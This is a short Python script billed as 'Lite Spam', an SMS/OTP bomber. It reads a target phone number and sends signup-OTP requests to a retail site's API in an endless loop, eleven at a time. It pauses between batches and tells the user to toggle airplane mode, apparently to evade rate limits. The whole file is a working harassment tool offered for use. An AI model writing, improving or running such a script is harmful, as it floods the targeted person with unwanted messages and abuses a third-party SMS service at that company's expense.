import requests
from bs4 import BeautifulSoup
import json
import random
import os
import time


c = requests.Session()

def banner():
    os.system("clear")
    print ("""                  ██╗     ██╗████████╗███████╗
                  ██║     ██║╚══██╔══╝██╔════╝
                  ██║     ██║   ██║   █████╗
                  ██║     ██║   ██║   ██╔══╝
                  ███████╗██║   ██║   ███████╗
                  ╚══════╝╚═╝   ╚═╝   ╚══════╝
              ███████╗██████╗  █████╗ ███╗   ███╗
              ██╔════╝██╔══██╗██╔══██╗████╗ ████║
              ███████╗██████╔╝███████║██╔████╔██║
              ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
              ███████║██║     ██║  ██║██║ ╚═╝ ██║  
              ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝   V 0.1
             ╔═════════════════════════════════════╗
             ║  Auth   : Puxonz                    ║
             ║  Fb     : Norman Ferdiansyah        ║
             ║  Github : github.com/Sruntul-code   ║
             ╚═════════════════════════════════════╝
    """)
    function()
def function():
    url = "https://cmsapi.mapclub.com/api/signup-otp"
    ua = {
         "User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36",
         "Connection": "keep-alive"
    }
    number = input("             Phone Number : ")
    print("")
    while True:
        for i in range(11):
             data = {
                  "phone":number
             }
             r = c.post(url, headers=ua, data=data)
             if r.status_code == 200:
                  print ("            [√] Success Send Otp To "+number)
             else:
                  print ("             [x] Failed Send Otp To "+number)
        print ("             [!] On Off Mode Pesawat")
        time.sleep(25)

banner()
